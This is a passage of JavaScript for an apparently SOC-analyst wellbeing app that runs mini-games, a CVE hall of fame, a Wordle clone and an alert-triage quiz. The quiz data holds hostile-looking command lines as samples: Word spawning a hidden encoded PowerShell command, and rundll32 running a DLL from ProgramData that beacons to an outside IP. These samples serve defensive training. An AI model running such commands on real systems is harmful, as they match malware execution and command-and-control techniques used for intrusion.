  $("#menuOld").innerHTML=old.map(c=>menuCard(c,true)).join("")||'<div class="small">No classics match.</div>';
}
function starClick(e){ const b=e.target.closest("[data-star]"); if(!b) return; const id=b.dataset.star;
  watch=watch.includes(id)?watch.filter(x=>x!==id):watch.concat(id); store.set("watch",watch);
  toast(watch.includes(id)?"Added to your watchlist":"Removed from watchlist"); renderMenu(); renderMe(); }
$("#menuNow").onclick=starClick; $("#menuOld").onclick=starClick;
$("#mf").onclick=e=>{ const f=e.target.dataset.f; if(!f) return; mfilter=f; renderMenu(); };
$("#mq").oninput=renderMenu;

/* ---------------- hall of fame ---------------- */
let era="all";
function renderHof(){
  $("#eras").innerHTML=["all","classic","modern","recent"].map(e=>`<button class="${e===era?'on':''}" data-e="${e}">${e==="all"?"all eras":e}</button>`).join("");
  $("#hof").innerHTML=FP_DATA.hof.filter(h=>era==="all"||h.era===era).map(h=>`<div class="mcard">
    <div class="row"><span class="nick">${esc(h.nick)}</span><span class="small">${h.year}</span></div>
    <div class="cve">${esc(h.id)} · ${esc(h.product)}</div>
    <div class="roast">${esc(h.roast)}</div>
    <div class="u9">Analyst mood: ${esc(h.feel)}</div>
    <div class="lbl">the lesson</div><div class="u10">${esc(h.lesson)}</div>
    <div class="hug">${esc(h.hug)}</div></div>`).join("");
  const near=nearestHistory();
  $("#tl").innerHTML=FP_DATA.history.slice().sort((a,b)=>a.year-b.year||a.md.localeCompare(b.md)).map(e=>{
    const [m,d]=e.md.split("-").map(Number); const dt=new Date(e.year,m-1,d).toLocaleDateString(undefined,{day:"numeric",month:"short",year:"numeric"});
    return `<div class="tli ${e===near.e?'near':''}"><div class="d">${dt}${e===near.e?" ":""}</div><div class="u11">${esc(e.t)}</div><div class="u12 small">${esc(e.d)}</div></div>`; }).join("");
}
$("#eras").onclick=e=>{ const v=e.target.dataset.e; if(!v) return; era=v; renderHof(); };

/* ---------------- learn ---------------- */
function table(rows,heads){ return `<tr>${heads.map(h=>`<th>${h}</th>`).join("")}</tr>`+rows.map(r=>`<tr>${r.map(c=>`<td>${esc(c)}</td>`).join("")}</tr>`).join(""); }
function renderEv(){ const q=$("#evq").value.toLowerCase(); $("#evt").innerHTML=table(EVENTS.filter(r=>r.join(" ").toLowerCase().includes(q)),["ID","Meaning","Why you care"]); }
$("#evq").oninput=renderEv;
$("#syst").innerHTML=table(SYSMON,["Sysmon ID","Event","Why you care"]);
$("#lgt").innerHTML=table(LOGONS,["Type","Name","Typical source"]);
$("#ltabs").onclick=e=>{ const p=e.target.dataset.p; if(!p) return;
  $$("#ltabs button").forEach(b=>b.classList.toggle("on",b.dataset.p===p)); $$("#v-learn .pane").forEach(x=>x.classList.toggle("on",x.id==="l-"+p)); };
let ci=Math.floor(Math.random()*ATTACK.length), cRight=0, cSeen=0;
function showCard(){ const c=ATTACK[ci%ATTACK.length]; $("#flip").classList.remove("on");
  $("#ff1").innerHTML=`<div class="small">MITRE ATT&CK technique</div><div class="big">${esc(c[0])}</div><div class="u13 small">what is it?</div>`;
  $("#fb1").innerHTML=`<div class="big">${esc(c[1])}</div><div class="u13 small">${esc(c[0])}</div>`;
  $("#cardScore").textContent=cSeen?`${cRight}/${cSeen} this session`:""; }
$("#flip").onclick=()=>$("#flip").classList.toggle("on");
$("#cardYes").onclick=()=>{ cRight++; cSeen++; bump("card"); ci++; showCard(); };
$("#cardNo").onclick=()=>{ cSeen++; ci++; showCard(); };

/* ---------------- SOCdle ---------------- */
const WORD = pick(WORDS, dayNum()*7+3);
let dle = store.get("dle_"+todayKey(), {guesses:[],done:false,won:false});
let cur="";
function scoreGuess(g,ans){ const res=Array(5).fill("x"), a=ans.split(""), used=Array(5).fill(false);
  for(let i=0;i<5;i++) if(g[i]===a[i]){ res[i]="g"; used[i]=true; }
  for(let i=0;i<5;i++) if(res[i]!=="g"){ const j=a.findIndex((ch,k)=>!used[k]&&ch===g[i]); if(j>-1){ res[i]="y"; used[j]=true; } }
  return res; }
function renderBoard(){
  let html=""; for(let r=0;r<6;r++){ const g=dle.guesses[r], sc=g?scoreGuess(g,WORD[0]):null, live=!g&&r===dle.guesses.length&&!dle.done;
    html+=`<div class="brow">${[0,1,2,3,4].map(i=>`<div class="tile ${sc?sc[i]:""}">${g?g[i]:(live?(cur[i]||""):"")}</div>`).join("")}</div>`; }
  $("#board").innerHTML=html;
  const best={}; dle.guesses.forEach(g=>{ const sc=scoreGuess(g,WORD[0]); g.split("").forEach((ch,i)=>{ const rank={g:3,y:2,x:1}[sc[i]]; if(!best[ch]||best[ch]<rank) best[ch]=rank; }); });
  const rows=["QWERTYUIOP","ASDFGHJKL","ZXCVBNM"];
  $("#kbd").innerHTML=rows.map(r=>`<div class="krow">${r.split("").map(k=>{ const cls=best[k]===3?"g":best[k]===2?"y":best[k]===1?"x":"";
    return `<button class="key ${k===""||k===""?"wide":""} ${cls}" data-k="${k}">${k===""?"ENTER":k}</button>`; }).join("")}</div>`).join("");
  if(dle.done){ $("#dleMsg").innerHTML=`${dle.won?"Nailed it!":"Not today."} The word was <b>${WORD[0]}</b>. <span class="u14">${esc(WORD[1])}</span>`; }
  const st=store.get("dleStats",{played:0,won:0,streak:0,best:0});
  $("#dleStats").innerHTML=`Played: <b>${st.played}</b> · Won: <b>${st.won}</b><br>Streak: <b>${st.streak}</b> · Best: <b>${st.best}</b>`;
  $("#dleNew").style.display=dle.done?"none":"";
}
function dleKey(k){
  if(dle.done) return;
  if(k===""||k==="BACKSPACE"){ cur=cur.slice(0,-1); }
  else if(k===""||k==="ENTER"){
    if(cur.length<5){ $("#dleMsg").textContent="Need 5 letters. Even attackers know that much."; return; }
    dle.guesses.push(cur); cur="";
    const won=dle.guesses[dle.guesses.length-1]===WORD[0];
    if(won||dle.guesses.length>=6){ dle.done=true; dle.won=won;
      const st=store.get("dleStats",{played:0,won:0,streak:0,best:0}); st.played++; if(won){st.won++;st.streak++;st.best=Math.max(st.best,st.streak);} else st.streak=0; store.set("dleStats",st);
      blip(won?880:220); }
    else $("#dleMsg").textContent="";
    store.set("dle_"+todayKey(),dle); renderBrew();
  }
  else if(/^[A-Z]$/.test(k)&&cur.length<5){ cur+=k; }
  renderBoard();
}
$("#kbd").onclick=e=>{ const k=e.target.closest(".key"); if(k) dleKey(k.dataset.k); };
document.addEventListener("keydown",e=>{ if(!$("#v-socdle").classList.contains("on")||e.metaKey||e.ctrlKey||e.altKey||(e.target&&e.target.closest&&e.target.closest("input,textarea"))) return;
  const k=e.key.toUpperCase(); if(k==="ENTER"||k==="BACKSPACE"||/^[A-Z]$/.test(k)){ e.preventDefault(); dleKey(k); } });
$("#dleShare").onclick=()=>{ if(!dle.done){ toast("Finish today's SOCdle first "); return; }
  const grid=dle.guesses.map(g=>scoreGuess(g,WORD[0]).map(s=>s==="g"?"🟩":s==="y"?"🟨":"⬛").join("")).join("\n");
  copyText(`FP Café SOCdle #${dayNum()+1} ${dle.won?dle.guesses.length:"X"}/6\n${grid}`); };

/* ---------------- aquarium ---------------- */
const aq=$("#aq"), cv=$("#tank"), cx=cv.getContext("2d");
let W=0,H=0,fish=[],bubbles=[];
function resize(){ const r=aq.getBoundingClientRect(), dpr=window.devicePixelRatio||1; if(!r.width) return; W=r.width; H=r.height; cv.width=W*dpr; cv.height=H*dpr; cx.setTransform(dpr,0,0,dpr,0,0); }
new ResizeObserver(resize).observe(aq);
function colorFor(f){ if(f.kind==="gold") return "#FFD36B"; if(f.kind==="shark") return "#E8505B"; if(f.kind==="phish") return "#F5B841"; if(f.kind==="hof") return "#A9A1E8"; if(f.data.kev===true) return "#E8505B"; return f.data.sev==="critical"?"#F2946B":"#7FB7EE"; }
function spawn(data,kind,inside){ const dir=Math.random()<.5?1:-1, w=W||800, h=H||480;
  return {data,kind,size:kind==="phish"?18:kind==="hof"?16:(data.sev==="critical"?26:22),
    x:inside?40+Math.random()*(w-80):(dir>0?-60-Math.random()*300:w+60+Math.random()*300), y:50+Math.random()*(h-130),
    vx:dir*(0.25+Math.random()*0.45)*(kind==="hof"?0.7:1), ph:Math.random()*6.28, label:kind==="phish"?"phish?":data.nick}; }
let seeded=false;
function seedTank(){ fish=[]; FP_DATA.trending.forEach(t=>fish.push(spawn(t,"trend",true)));
  FP_DATA.hof.slice().sort(()=>Math.random()-.5).slice(0,6).forEach(h=>fish.push(spawn(h,"hof",true))); fish.push(spawn(null,"phish",true)); seeded=true; if(typeof extraFish==="function") extraFish(); }
function drawFish(f,t){
  const y=f.y+Math.sin(t/900+f.ph)*6, s=f.size, dir=Math.sign(f.vx)||1, col=colorFor(f);
  cx.save(); cx.translate(f.x,y); cx.scale(dir,1);
  if(f.kind==="phish"){ cx.strokeStyle="#9fb3c8"; cx.lineWidth=1; cx.beginPath(); cx.moveTo(s*.6,-s*.5); cx.lineTo(s*.6,-y); cx.stroke(); cx.beginPath(); cx.arc(s*.6,-s*.35,4,0,Math.PI); cx.stroke(); }
  cx.fillStyle=col; cx.globalAlpha=.95; cx.beginPath(); cx.ellipse(0,0,s,s*.62,0,0,6.283); cx.fill();
  const wag=Math.sin(t/180+f.ph)*s*.18; cx.beginPath(); cx.moveTo(-s*.85,0); cx.lineTo(-s*1.55,-s*.55+wag); cx.lineTo(-s*1.55,s*.55+wag); cx.closePath(); cx.fill();
  cx.globalAlpha=1; cx.fillStyle="#0b1a2b"; cx.beginPath(); cx.arc(s*.45,-s*.12,s*.13,0,6.283); cx.fill();
  cx.fillStyle="#fff"; cx.beginPath(); cx.arc(s*.49,-s*.17,s*.05,0,6.283); cx.fill();
  cx.restore();
  if(f.data&&f.data.kev===true&&f.kind==="trend"){ cx.fillStyle="#0b1a2b"; cx.font=`bold ${Math.round(s*.42)}px ui-monospace,monospace`; cx.textAlign="center"; cx.fillText("KEV",f.x-dir*s*.15,y+s*.18); } cx.fillStyle="#d7e6f5cc"; cx.font="12px Atkinson, system-ui, sans-serif"; cx.textAlign="center"; cx.fillText(f.label,f.x,y+s+14); f.drawY=y; }
function loop(t){
  if(W&&$("#v-lounge").classList.contains("on")){
    if(!seeded) seedTank();
    cx.clearRect(0,0,W,H);
    for(let i=0;i<4;i++){ const x=(i*W/3.3+t/60)%(W+200)-100, g=cx.createLinearGradient(x,0,x+80,H); g.addColorStop(0,"#8fd3ff14"); g.addColorStop(1,"#8fd3ff00");
      cx.fillStyle=g; cx.beginPath(); cx.moveTo(x,0); cx.lineTo(x+60,0); cx.lineTo(x+200,H); cx.lineTo(x+120,H); cx.fill(); }
    cx.fillStyle="#0c2235"; cx.fillRect(0,H-26,W,26);
    for(let i=0;i<W;i+=70){ cx.strokeStyle="#2f7a5c"; cx.lineWidth=4; cx.beginPath(); cx.moveTo(i+20,H-20); for(let k=1;k<6;k++) cx.lineTo(i+20+Math.sin(t/700+i+k)*7,H-20-k*14); cx.stroke(); }
    if(typeof drawDecor==="function") drawDecor(t);
    if(Math.random()<.08) bubbles.push({x:Math.random()*W,y:H,r:1+Math.random()*3});
    cx.strokeStyle="#bfe3ff55"; bubbles.forEach(b=>{ b.y-=.6+b.r*.2; cx.beginPath(); cx.arc(b.x+Math.sin(b.y/20)*3,b.y,b.r,0,6.283); cx.stroke(); }); bubbles=bubbles.filter(b=>b.y>-10);
    fish.forEach(f=>{ f.x+=f.vx; if(f.vx>0&&f.x>W+80){f.x=-80;f.y=50+Math.random()*(H-130);} if(f.vx<0&&f.x<-80){f.x=W+80;f.y=50+Math.random()*(H-130);} drawFish(f,t); });
  }
  requestAnimationFrame(loop);
}
cv.addEventListener("click",e=>{
  const r=cv.getBoundingClientRect(), mx=e.clientX-r.left, my=e.clientY-r.top; let best=null, bd=1e9;
  fish.forEach(f=>{ const d=Math.hypot(f.x-mx,(f.drawY||f.y)-my); if(d<f.size*1.6&&d<bd){bd=d;best=f;} });
  if(!best) return; blip(best.kind==="phish"?330:720); let html;
  if(best.kind==="gold"||best.kind==="shark"){ html=specialFish(best); }
  else if(best.kind==="phish"){ bump("phish"); html=`<div class="id">REPORT-PHISH</div><div class="t">Phish caught!</div>You reported it instead of clicking it. Security awareness training: <b>working</b>.<br><span class="small">It respawns. They always respawn.</span>`; fish[fish.indexOf(best)]=spawn(null,"phish"); }
  else { const d=best.data; fishCaught(d.id); html=`<div class="id">${esc(d.id)} · ${esc(d.product)}${d.kev===true?" · <span class='u15'>in KEV</span>":""}</div>
    <div class="t">${esc(d.nick)}</div><div>${esc(d.roast)}</div>
    <div class="u16 small">${esc(d.why||d.lesson)}</div>
    ${d.action?`<div class="u17 small">${esc(d.action)}</div>`:""}
    <a class="u6 btn sm" href="#menu">open the menu →</a>`; }
  $("#fcbody").innerHTML=html; $("#fishcard").classList.add("show"); });
$("#fcx").onclick=()=>$("#fishcard").classList.remove("show");
$("#fs").onclick=async()=>{ try{ if(document.fullscreenElement) await document.exitFullscreen(); else await aq.requestFullscreen(); }catch(e){ toast("Fullscreen is blocked here. Try ambient mode instead."); } };

/* ---------------- break room ---------------- */
$("#tabs").onclick=e=>{ const p=e.target.dataset.p; if(!p) return; $$("#tabs button").forEach(b=>b.classList.toggle("on",b.dataset.p===p)); $$("#v-breakroom .pane").forEach(x=>x.classList.toggle("on",x.id==="p-"+p)); };
const FPL=["FP","4625","DNS","AV","UEBA","GEO","MFA","EDR","PS1","IMP"];
function fillWrap(){ $("#wrapgrid").innerHTML=Array.from({length:50},(_,i)=>`<button class="pop">${FPL[i%FPL.length]}</button>`).join(""); }
$("#wrapgrid").onclick=e=>{ const b=e.target.closest(".pop"); if(!b||b.classList.contains("popped")) return; b.classList.add("popped"); b.textContent=""; bump("pop"); blip(500+Math.random()*500);
  if(!document.querySelector(".pop:not(.popped)")) toast("Queue empty! (This has never happened in real life.)"); };
$("#refill").onclick=()=>{ fillWrap(); toast("50 new false positives arrived. Tuesday energy."); };
let breathing=false;
$("#bstart").onclick=async()=>{ if(breathing) return; breathing=true; const orb=$("#orb"), pk=$("#pk"), wait=ms=>new Promise(r=>setTimeout(r,ms));
  for(let i=0;i<3;i++){ orb.textContent="SYN"; pk.textContent="Client → You: SYN (breathe in…)"; orb.style.transition="transform 4s ease-in-out"; orb.style.transform="scale(1)"; await wait(4000);
    orb.textContent="SYN-ACK"; pk.textContent="You → Client: SYN-ACK (hold…)"; await wait(4000);
    orb.textContent="ACK"; pk.textContent="Client → You: ACK (breathe out slowly…)"; orb.style.transition="transform 6s ease-in-out"; orb.style.transform="scale(.6)"; await wait(6000); }
  orb.textContent="ESTABLISHED"; pk.textContent="Connection established: calm (no RST received)"; bump("breath"); breathing=false; };
const SMASH=["PRINTER-3F-02 has been neutralised. It will return.","Printer down. Morale up.","The printer has been isolated. Emotionally.","Incident closed: root cause = printer existed.","PC LOAD LETTER? Not today."];
$("#bigred").onclick=()=>{ bump("smash"); sfx("smash"); sfx2("jam"); const z=$("#smashzone"); z.classList.remove("shake"); void z.offsetWidth; z.classList.add("shake");
  $("#smashtxt").textContent=pick(SMASH,stats.smash);
  for(let i=0;i<10;i++){ const s=document.createElement("span"); s.className="boom";
    s.style.left="50%"; s.style.top="40%"; s.style.setProperty("--dx",(Math.random()*300-150)+"px"); s.style.setProperty("--dy",(Math.random()*-200+40)+"px"); z.appendChild(s); setTimeout(()=>s.remove(),1000); } };
const FF=[
 {q:"EventID 4625 x 3,200\nAccount: svc_backup\nSource: BACKUP-01\nWindow: 02:00–02:05",a:"FP",why:"Expired password on a backup service account. Persistent, like you."},
 {q:"powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0A...\nParent: WINWORD.EXE",a:"TP",why:"Word spawning hidden encoded PowerShell is never a vibe. Isolate and investigate."},
 {q:"Impossible travel: Singapore → Frankfurt in 9 minutes\nUser: j.tan\nUser-Agent: corporate VPN client",a:"FP",why:"VPN egress moved countries; the user did not. Classic geo FP."},
 {q:"New service: 'WindowsUpdateSvc'\nImage: C:\\Users\\Public\\upd.exe\nEventID 7045",a:"TP",why:"Real services don't live in C:\\Users\\Public. That's an attacker naming things to sound boring."},
 {q:"DNS spike to *.windowsupdate.com\nHosts: 400 endpoints\nTime: Patch Tuesday, 18:05 UTC",a:"FP",why:"It's Patch Tuesday. Everyone is downloading updates. Breathe."},
 {q:"rundll32.exe C:\\ProgramData\\a.dll,DllRegisterServer\nOutbound to 185.x.x.x:443 every 60s exactly",a:"TP",why:"A DLL in ProgramData beaconing on a perfect 60s timer = C2 heartbeat. Contain it."},
 {q:"EventID 1102: The audit log was cleared\nAccount: helpdesk_temp\nHost: FILESRV-02\nTime: 03:12",a:"TP",why:"A temp helpdesk account clearing logs at 3 AM is someone covering tracks. Escalate."},
 {q:"4740 account lockout x 1\nUser: m.lee\nSource: m.lee's phone (ActiveSync)\nAfter: password change at 09:00",a:"FP",why:"Old password still saved on the phone. The most common lockout in history."}
];
let ffi=Math.floor(Math.random()*FF.length), ffAns=false;
function showFF(){ $("#ffq").textContent=FF[ffi%FF.length].q; $("#ffres").textContent=""; ffAns=false; }
function answer(g){ if(ffAns) return; ffAns=true; const f=FF[ffi%FF.length], ok=g===f.a; if(ok) bump("ffok");
  $("#ffres").innerHTML=`${ok?"Correct!":"Not quite."} <b>${f.a==="FP"?"False positive":"True positive"}</b>: ${esc(f.why)}`; blip(ok?880:220); }
$("#ffFP").onclick=()=>answer("FP"); $("#ffTP").onclick=()=>answer("TP"); $("#ffnext").onclick=()=>{ ffi++; showFF(); };

/* ---------------- shift buddy ---------------- */
function renderShift(){
  const len=store.get("shiftLen",12);
  $("#shiftLen").innerHTML=[8,9,10,12].map(h=>`<button class="${h===len?'on':''}" data-h="${h}">${h}h</button>`).join("");
  const on=!!store.get("shiftStart",null);
  $("#shiftBtn").textContent=on?"End shift":"Start shift"; $("#shiftBtn").classList.toggle("on",on);
  if(!on){ $("#shiftClock").textContent="--:--:--"; $("#shiftBar").style.width="0"; $("#shiftInfo").textContent="Not on shift. Enjoy it."; }
}
$("#shiftLen").onclick=e=>{ const h=+e.target.dataset.h; if(!h) return; store.set("shiftLen",h); renderShift(); };
$("#shiftBtn").onclick=()=>{ if(store.get("shiftStart",null)){ store.set("shiftStart",null); toast("Shift ended. You did good. Now log off for real. "); }
  else { store.set("shiftStart",Date.now()); toast("Shift started. Patch is on duty with you. "); } renderShift(); };

const NUDGE={eyes:[20,"20-20-20: look at something 20 ft away for 20 seconds. Not the SIEM."],water:[60,"Hydration check. Logs aren't a beverage."],
  stretch:[90,"Stand up, roll your shoulders. The alerts will wait 60 seconds."],focus:[25,"Focus block done. Take 5 — try the Break Room."]};
const nudgeT={};
function setNudge(k,on){ clearInterval(nudgeT[k]); clearTimeout(nudgeT[k]); delete nudgeT[k];
  if(on){ const [m,msg]=NUDGE[k]; nudgeT[k]=k==="focus"?setTimeout(()=>{ toast(msg); setNudge("focus",false); renderNudges(); },m*60000):setInterval(()=>toast(msg),m*60000); }
  const n=store.get("nudges",{}); n[k]=on&&k!=="focus"; store.set("nudges",n); }
function renderNudges(){ $$("[data-n]").forEach(b=>{ const on=!!nudgeT[b.dataset.n]; b.textContent=on?"on":"off"; b.classList.toggle("on",on); }); }
$$("[data-n]").forEach(b=>b.onclick=()=>{ const k=b.dataset.n, on=!nudgeT[k]; setNudge(k,on); renderNudges(); toast(on?"Nudge on. Patch will remind you.":"Nudge off."); });
Object.entries(store.get("nudges",{})).forEach(([k,v])=>{ if(v) setNudge(k,true); });

const DEFAULT_CK=["Check SIEM/EDR health dashboards (ingestion OK?)","Read the previous shift's handover","Review open high-severity incidents","Check today's Morning Brew for new KEV items","Confirm on-call / escalation contacts","Do today's SOCdle (morale is a control)"];
let ck=(a=>Array.isArray(a)?a.filter(c=>c&&typeof c.t==="string").map(c=>({t:c.t.slice(0,120),d:!!c.d})).slice(0,40):null)(store.get("checklist",null))||DEFAULT_CK.map(t=>({t,d:false}));
function renderCk(){ $("#checklist").innerHTML=ck.map((c,i)=>`<label class="check ${c.d?'done':''}"><input type="checkbox" data-i="${i}" ${c.d?"checked":""}><span>${esc(c.t)}</span></label>`).join("");
  $("#ckCount").textContent=`${ck.filter(c=>c.d).length}/${ck.length}`; }
$("#checklist").onchange=e=>{ const i=+e.target.dataset.i; ck[i].d=e.target.checked; store.set("checklist",ck); renderCk(); if(ck.every(c=>c.d)) toast("Checklist complete. Patch is proud. "); };
$("#ckAdd").onclick=()=>{ const v=$("#ckNew").value.trim(); if(!v) return; ck.push({t:v.slice(0,120),d:false}); $("#ckNew").value=""; store.set("checklist",ck); renderCk(); };
$("#ckReset").onclick=()=>{ ck.forEach(c=>c.d=false); store.set("checklist",ck); renderCk(); };
const pad=$("#pad"); pad.value=(v=>typeof v==="string"?v.slice(0,20000):"")(store.get("pad",""));
pad.oninput=()=>store.set("pad",pad.value);
$("#padTpl").onclick=()=>{ pad.value+=(pad.value?"\n\n":"")+`HANDOVER — ${new Date().toLocaleString()}\n\nOpen incidents (IDs only):\n- \n\nWaiting on (who / what):\n- \n\nWatch list for next shift:\n- \n\nTool health issues:\n- \n\nVibes: `; store.set("pad",pad.value); };
$("#padCopy").onclick=()=>copyText(pad.value);
$("#padClear").onclick=()=>{ pad.value=""; store.set("pad",""); toast("Scratchpad cleared."); };

/* ======================= v3: profile & personalisation ======================= */
const ROLES=["L1 analyst","IR / L2","Detection eng","Threat hunter","SOC manager"];
const SIEMS=["Sentinel / Defender","Splunk","Google SecOps","Elastic","QRadar","Other"];
const VENDORS=["Microsoft","Cisco","Fortinet","Palo Alto","Ivanti","Citrix","VMware","Linux","Open source"];
const BUDDIES={cat:{e:"",n:"Patch",d:"sleepy firewall cat"},owl:{e:"",n:"Hoot",d:"night-shift owl"},fox:{e:"",n:"Proxy",d:"sneaky-smart fox"},panda:{e:"",n:"Bamboo",d:"chill panda"}};
const VENDOR_OF={"CVE-2026-31431":"Linux","CVE-2026-39987":"Open source","CVE-2026-76461":"Cisco","CVE-2025-53770":"Microsoft","CVE-2024-3400":"Palo Alto",
 "CVE-2014-0160":"Open source","CVE-2014-6271":"Linux","CVE-2017-0144":"Microsoft","CVE-2020-1472":"Microsoft","CVE-2021-26855":"Microsoft","CVE-2021-34527":"Microsoft",
 "CVE-2021-44228":"Open source","CVE-2022-30190":"Microsoft","CVE-2023-34362":"Other","CVE-2023-4966":"Citrix","CVE-2024-3094":"Linux","CVE-2024-6387":"Linux"};
const BREW_TAGS=[["Cisco"],["Open source"],["Microsoft","Citrix"]];
let prof=store.get("profile",null);
let watch=(a=>Array.isArray(a)?a.filter(x=>typeof x==="string"&&/^CVE-\d{4}-\d{3,7}$/.test(x)).slice(0,200):[])(store.get("watch",[]));
function P(){ // every field is validated, so tampered or imported data can't inject anything
  const d={name:"",role:"L1 analyst",siem:"Sentinel / Defender",stack:[],humor:"spicy",buddy:"cat"}, p=(prof&&typeof prof==="object")?prof:{};
  return {name:typeof p.name==="string"?p.name.replace(/[^\p{L}\p{N} ._-]/gu,"").slice(0,24):"",
    role:ROLES.includes(p.role)?p.role:d.role, siem:SIEMS.includes(p.siem)?p.siem:d.siem,
    stack:Array.isArray(p.stack)?p.stack.filter(v=>VENDORS.includes(v)):[], humor:p.humor==="gentle"?"gentle":"spicy",
    buddy:Object.prototype.hasOwnProperty.call(BUDDIES,p.buddy)?p.buddy:"cat"}; }
function BUD(){ const k=P().buddy; return Object.assign({key:k},BUDDIES[k]||BUDDIES.cat); }
function isMine(c){ const v=VENDOR_OF[c.id]; return !!v && P().stack.includes(v); }
function mineTags(tags){ return tags.some(t=>P().stack.includes(t))?1:0; }

function greeting(){ const h=new Date().getHours(), n=P().name;
  const g=h>=22||h<6?"Night-shift hero":h<12?"Good morning":h<18?"Good afternoon":"Good evening";
  return `${BUD().e} ${g}${n?", "+esc(n):""}`; }
function applyProfile(){
  const b=BUD(); $$(".bname").forEach(x=>x.textContent=b.n); $$(".bemoji").forEach(x=>x.textContent=b.e);
  $("#hello").innerHTML=greeting();
  if(HORO[P().role]){ role=P().role; }
  renderHoro(); renderBrew(); renderMenu(); renderMe(); patchSays(); renderDet(); renderDetLab(); renderArcade();
  if(typeof applyHat==="function"&&typeof inv!=="undefined"){ applyHat(); renderPet(); }
}

/* onboarding */
let draft=null;
function optRow(id,items,sel,multi,label=x=>x){ $(id).innerHTML=items.map(x=>`<button data-o="${esc(x)}" class="${(multi?sel.includes(x):sel===x)?'on':''}">${label(x)}</button>`).join(""); }
function renderOnb(){
  optRow("#oRole",ROLES,draft.role); optRow("#oSiem",SIEMS,draft.siem); optRow("#oStack",VENDORS,draft.stack,true);
  optRow("#oHumor",["gentle","spicy"],draft.humor,false,x=>x==="gentle"?"gentle & kind":"spicy roasts");
  optRow("#oBuddy",Object.keys(BUDDIES),draft.buddy,false,k=>`${BUDDIES[k].e} ${BUDDIES[k].n} <span class="small">(${BUDDIES[k].d})</span>`);
}
function openOnb(){ draft=JSON.parse(JSON.stringify(P())); $("#oName").value=draft.name; renderOnb(); $("#onb").classList.add("show"); }
[["#oRole","role"],["#oSiem","siem"],["#oHumor","humor"],["#oBuddy","buddy"]].forEach(([id,k])=>$(id).onclick=e=>{ const b=e.target.closest("[data-o]"); if(!b) return; draft[k]=b.dataset.o; renderOnb(); });
$("#oStack").onclick=e=>{ const b=e.target.closest("[data-o]"); if(!b) return; const v=b.dataset.o; draft.stack=draft.stack.includes(v)?draft.stack.filter(x=>x!==v):draft.stack.concat(v); renderOnb(); };
$("#oSave").onclick=()=>{ draft.name=$("#oName").value.trim(); prof=draft; prof=P(); store.set("profile",prof); store.set("role",prof.role); $("#onb").classList.remove("show"); applyProfile(); toast(`${BUD().e} ${BUD().n} is now your buddy. Welcome${prof.name?", "+prof.name:""}!`); };
$("#oSkip").onclick=()=>{ if(!prof){ prof=P(); store.set("profile",prof); } $("#onb").classList.remove("show"); applyProfile(); };
$("#editProf").onclick=openOnb;

/* mood */
const MOODS=[["","Great"],["","Good"],["","Meh"],["","Drained"],["streak","On fire (bad kind)"]];
const MOOD_REPLY=["Love that energy. Go hunt something. ","Steady is good. Steady is underrated.","Meh is valid. Small wins today: one ticket at a time.",
  "Drained is real. Take your breaks for real today, and the Break Room is one click away. ","Ouch. Breathe first (try Handshake breathing), and loop in your lead if the load is too much. You don't have to carry it alone."];
function moods(){ const m=store.get("moods",{}), o={}; if(m&&typeof m==="object") Object.entries(m).forEach(([k,v])=>{ if(/^\d{4}-\d{1,2}-\d{1,2}$/.test(k)&&Number.isInteger(v)&&v>=0&&v<MOODS.length) o[k]=v; }); return o; }
function todayMood(){ const m=moods()[todayKey()]; return m===undefined?null:m; }
function renderMood(){ const m=todayMood();
  $("#moods").innerHTML=MOODS.map((x,i)=>`<button data-m="${i}" class="${m===i?'on':''}" title="${x[1]}">${x[0]}</button>`).join("");
  $("#moodReply").textContent=m===null?"One tap check-in. Your buddy adjusts to how you feel.":`${BUD().e} ${MOOD_REPLY[m]}`; }
$("#moods").onclick=e=>{ const b=e.target.closest("[data-m]"); if(!b) return; const all=moods(); all[todayKey()]=+b.dataset.m; store.set("moods",all);
  renderMood(); patchSays(); renderGame(); };
function lastDays(n){ const out=[]; for(let i=n-1;i>=0;i--){ const d=new Date(); d.setDate(d.getDate()-i); out.push(d); } return out; }
function dk(d){ return `${d.getFullYear()}-${d.getMonth()+1}-${d.getDate()}`; }

/* quests, XP, badges */
function quests(){ return [
  ["Read today's Morning Brew", store.get("brewSeen","")===todayKey(), "#brew"],
  ["Play today's SOCdle", !!(store.get("dle_"+todayKey(),{}).done), "#socdle"],
  ["Mood check-in", todayMood()!==null, "#lounge"],
  ["Take one real break", store.get("brk_"+todayKey(),0)>0, "#breakroom"],
  ["Play one Arcade game", !!store.get("arc_"+todayKey(),false), "#arcade"]]; }
function xp(){ const st=store.get("dleStats",{won:0}); return stats.pop+stats.smash+stats.breath*10+stats.phish*5+stats.ffok*5+stats.card*3+stats.arcade*15+stats.brew*10+(st.won||0)*20+Object.keys(moods()).length*5; }
const LEVELS=[[0,"","Fresh Intern"],[50,"","Alert Tamer"],[150,"","Log Whisperer"],[300,"","Triage Ninja"],[600,"","Threat Hunter"],[1000,"","Incident Wrangler"],[1600,"","SOC Sensei"],[2500,"","Legendary Defender"]];
function level(){ const x=xp(); let i=0; LEVELS.forEach((l,j)=>{ if(x>=l[0]) i=j; }); const next=LEVELS[i+1]; return {i,x,cur:LEVELS[i],next}; }
const BADGES=[
  ["hook","First Catch","Catch a phish in the aquarium",()=>stats.phish>=1],["fish","Phish Whisperer","Catch 10 phish",()=>stats.phish>=10],
  ["bubble","Bubble Popper","Pop 100 false positives",()=>stats.pop>=100],["wave","Zen Handshake","Finish 5 breathing sessions",()=>stats.breath>=5],
  ["target","Sharp Eye","10 correct FP/TP calls",()=>stats.ffok>=10],["cards","Flashcard Nerd","Know 20 ATT&CK cards",()=>stats.card>=20],
  ["socdle","Word Nerd","Win a SOCdle",()=>(store.get("dleStats",{}).won||0)>=1],["flame","On a Streak","3-day SOCdle streak",()=>(store.get("dleStats",{}).best||0)>=3],
  ["brew","Regular","Read 5 Morning Brews",()=>stats.brew>=5],["arcade","Arcade Rat","Play 10 Arcade games",()=>stats.arcade>=10],["fame","Team Player","Add a teammate's score to a leaderboard",()=>Object.keys(allData()).some(k=>k.startsWith("fpc_lb_")&&lbGet(k.slice(7)).some(x=>!x.me))],
  ["moon","Night Owl","Visit during the night shift",()=>stats.night>=1],["printer","Printer Nemesis","Smash 50 printer alerts",()=>stats.smash>=50],
  ["heart","Self-aware","Do 7 mood check-ins",()=>Object.keys(moods()).length>=7],["star","Curator","Watch 3 CVEs",()=>watch.length>=3]];
let earned=new Set(store.get("badges",[]));
function renderGame(){
  const q=quests(), done=q.filter(x=>x[1]).length;
